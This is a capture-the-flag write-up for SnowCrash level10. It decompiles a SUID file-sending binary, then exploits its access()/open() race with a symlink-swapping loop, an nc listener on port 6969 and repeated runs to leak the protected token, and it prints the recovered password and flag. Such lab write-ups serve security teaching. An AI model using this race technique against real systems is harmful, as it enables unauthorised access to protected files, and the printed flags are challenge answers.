after inspecting the home directory we find the following

```shell
level10@SnowCrash:~$ ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ cat token
cat: token: Permission denied
```

the `level10` binary file has a `SUID` bit set, lets disassemble the file using [binary ninja](https://en.wikipedia.org/wiki/Binary_Ninja)
```C
int32_t main(int argc, char** argv)
{
  ...
 if (argc <= 2)
    {
        char* edx = *argv;
        var_1060 = "%s file host\n\tsends file to ho…";
        printf(var_1060, edx);
        var_1060 = 1;
        exit(var_1060);
        /* no return */
    }

    int32_t eax_5 = argv[1];
    int32_t eax_7 = argv[2];
    int32_t type = 4;
    var_1060 = argv[1];
    int32_t result;

    if (access(var_1060, type))
    {
        var_1060 = "You don't have access to %s\n";
        result = printf(var_1060, eax_5);
    }
    else
    {
        var_1060 = "Connecting to %s:6969 .. ";
        printf(var_1060, eax_7);
        ...
        int32_t fd = socket(var_1060, type_1, domain);
        ...
        if (connect(fd, &addr, 0x10) == 0xffffffff)
        {
            ...
            exit(var_1048);
        }

        size_t nbytes = 8;
        char const* const buf = ".*( )*.\n";
        char* var_1018;
        var_1048 = var_1018;

        if (write(var_1048, buf, nbytes) == 0xffffffff)
        {
            ...
            exit(var_1048);
            /* no return */
        }

        var_1048 = "Connected!\nSending file .. ";
        printf(var_1048);
        ...
        int32_t oflag = 0;
        char* var_1020;
        var_1048 = var_1020;
        int32_t eax_20 = open(var_1048, oflag);

        ...

        size_t nbytes_1 = 0x1000;
        void var_100c;
        void* buf_1 = &var_100c;
        var_1048 = eax_20;
        ssize_t nbytes_2 = read(var_1048, buf_1, nbytes_1);

        ...
        write(var_1048, buf_2, nbytes_2);
        var_1048 = "wrote file!";
        result = puts(var_1048);
    }
}
```

the program accepts two arguments: the name of a file and a network address. It first verifies if the user has read permissions for the specified file. If the check passes, the program reads the file's contents and transmits them over the network to port `6969`.

we can use a race condition to exploit the access function.

on 3 different ssh connections to the server we run the following

```shell
level10@SnowCrash:~$ echo > /tmp/fake
level10@SnowCrash:~$ while true; do ln -sf $PWD/token /tmp/link; ln -sf /tmp/fake /tmp/link; done
```
we create out symlink race condition

```shell
level10@SnowCrash:~$ while true; do nc -l 6969 > /tmp/token; cat /tmp/token; done
```
we await for the program to send us the token in a loop

```shell
level10@SnowCrash:~$ while true; do ./level10 /tmp/link 0.0.0.0; done
```
we run out program in a loop

we get the following output in out `nc` connection

```shell
level10@SnowCrash:~$ while true; do nc -l 6969 > /tmp/token; cat /tmp/token; done
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.

.*( )*.
woupa2yuojeeaaed06riuj63c
```

lets see if the token works

```shell
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

on to the next level
